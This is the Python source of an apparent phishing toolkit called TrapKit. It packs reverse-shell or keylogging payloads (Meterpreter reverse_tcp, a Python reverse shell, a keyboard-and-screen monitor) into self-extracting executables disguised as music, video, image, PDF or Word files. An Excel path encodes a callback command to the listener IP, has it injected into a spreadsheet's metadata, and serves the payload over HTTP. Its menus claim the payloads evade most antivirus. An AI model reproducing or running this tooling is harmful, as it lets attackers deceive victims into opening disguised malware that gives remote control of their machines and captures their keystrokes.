from os import remove, system, path, mkdir, popen
from termcolor import cprint
from pyfiglet import Figlet
from random import randint



def banner():
	custom_fig = Figlet(font='big')
	print(custom_fig.renderText('\t\tTrapKiT\n'))
	custom_fig = Figlet(font='future')
	line()


def line():
	cprint("==========================================================================================\n", 'white' ,attrs=['bold'])


def print_red(phrase):
	cprint(phrase, 'red' ,attrs=['bold'])


def phishing_choise():
	cprint("How would you like to phish: \n",attrs=['bold'])
	cprint("1 - Pre-built-in payload (suggested by TrapKit)", 'magenta' ,attrs=['bold'])
	cprint("2 - Custom payload (given by you)", 'magenta' ,attrs=['bold']);print("\n")
	ch = int(input("set> Your choise:")); line()

	return ch


def Liste_of_options():

	while True:
		cprint("1 - MP3 music (.mp3)", 'cyan' ,attrs=['bold'])
		cprint("2 - video (.mp4)", 'cyan' ,attrs=['bold'])
		cprint("3 - image (.png)", 'cyan' ,attrs=['bold'])
		cprint("4 - pdf document (.pdf)", 'cyan' ,attrs=['bold'])
		cprint("5 - MS word document (.docx)", 'cyan', attrs=['bold'])
		cprint("6 - MS excel (.xls)   [!] the most undetectable file type", 'cyan', attrs=['bold']);print("\n")
		format = int(input("set> The file format: ")); line()
		if format in range(1, 7, 1):
			return format


def Liste_of_payloads():

	while True:
		cprint("[!] TrapKit payloads are builded to be undetectable by most of the AVs", 'red','on_yellow',attrs=['bold']);print("\n")
		cprint("1 - msf/windows/meterpreter/reverse_tcp", 'cyan',attrs=['bold'])
		cprint("2 - TrapKit/python/x64/reverse_tcp", 'cyan',attrs=['bold'])
		cprint("3 - TrapKit/python/x64/monitor (keyboard&screen)", 'cyan',attrs=['bold']);print("\n")
		payload = int(input("set> The payload: ")); line()
		if payload in range(1, 4, 1):
			return payload


def input_file():
	file_type = Liste_of_options()
	extension = set_extension(file_type)

	#if xls was the choice than don't continue and return xls*3 [xls is different]
	if (extension == "xls"):
		return "xls", "xls", "xls"

	#get the file path and check its validation
	while True:
		file_path = input("set> The path to the file [!]absolute path: ")
		if (path.isfile(file_path) == False ):
			print_red("Incorrect file path")
			line()
		else:
			line()
			break

	full_file_name = popen(('echo "{file_path}" | rev | cut -d"/" -f 1 | rev').format(file_path=file_path)).read().split('\n')[0]
	file_name = popen(('echo "{file}" | cut -d"." -f 1').format(file=full_file_name)).read().split('\n')[0]
	system(("cp {file_path} .").format(file_path=file_path))

	return full_file_name, file_name, extension


def input_payload():
	while True:
		pay_path = input("set> The payload path [!]absolute path: ")
		if( path.isfile(pay_path) == False ):
			print_red("Incorrect payload path")
			line()
		else:
			line()
			break

	full_pay_name = popen(('echo "{pay_path}" | rev | cut -d"/" -f 1 | rev').format(pay_path=pay_path)).read().split('\n')[0]
	pay_name = popen(('echo "{file}" | cut -d"." -f 1').format(file=full_pay_name)).read().split('\n')[0]
	system(("cp {pay_path} .").format(pay_path=pay_path))

	return full_pay_name, pay_name


def Ip_port_input():
	Ip = input("set> IP address for the payload listener (LHOST): "); line()
	port = int(input("set> The port to connect back to (LPORT): ")); line()
	return Ip, port


def set_extension(argument):
	switcher = {
		1: "mp3",
		2: "mp4",
		3: "png",
		4: "pdf",
		5: "docx",
		6: "xls"
		}
	return switcher.get(argument, "Invalid file choice")


def generate(name, ex, r) :
	system(("rar a -sfxwin{ex}.SFX {name}.exe {name}.{ex} {r} && rar c {name}.exe < fileinit.txt").format(name=name,ex=ex, r=r))

	output_exist = path.isdir("./output")
	if output_exist == False:
		mkdir("output")

	system(("mv {name}.exe output/").format(name=name))
	system("rm fileinit.txt")
	system(("rm {r}").format(r=r))
	system(("rm {name}.{ex}").format(name=name, ex=ex))


def replace_line(file_name, line_num, text):
    lines = open(file_name, 'r').readlines()
    lines[line_num] = text
    out = open(file_name, 'w')
    out.writelines(lines)
    out.close()


def exe_prepare(file, HOST, PORT):
	text1 ="HOST=" +"'"+ HOST+"'" + "\n"
	text2 ="PORT=" + str(PORT) + "\n"
	replace_line(file, 18, text1)
	replace_line(file, 19, text2)


def init_prepare(name1, name2):
	system("cp requirements/firstinit.txt fileinit.txt")
	nameinit = "fileinit.txt"
	text1 = "Setup="+ name1 + "\n"
	text2 = "Setup=" + name2 + "\n"
	replace_line(nameinit, 2, text1)
	replace_line(nameinit, 3, text2)


def replace(file,gb_text,out) :
	#input file
	fin = open(file, "rt")
	#output file to write the result to
	fout = open(out, "wt")
	#for each line in the input file
	for line in fin:
		#read replace the string and write to output file
		fout.write(line.replace('IBOE', gb_text))
	#close input and output files
	fin.close()
	fout.close()


def special_excel(payload, Ip):

	if (path.isfile("text.txt.gz") == True):
		remove("text.txt.gz")

	if (Ip == "no"):
		Ip = input("set> The listener IP: ")

	text_0 = Ip + "/" + payload
	replace("shell.txt",text_0,"shell_out.txt")

	text_1 = popen("cat shell_out.txt").read().split('\n')[0]
	system(('echo -n "{text}" > text.txt').format(text=text_1))
	system("gzip text.txt")

	gb_text = popen("cat text.txt.gz | base64 | tr -d '\n' ").read()
	replace("codebeauty.xml", gb_text, "codebeauty_out.txt")

	to_replace = popen("base64 codebeauty_out.txt | tr -d '\n'").read()
	print("\n" + to_replace)

	cprint("\n[!] In your windows machine inject the above base64 text into the creator tag in output/sheet.xls", 'yellow' ,attrs=['bold']);print("\n")
	system("python3 -m http.server 80 &")
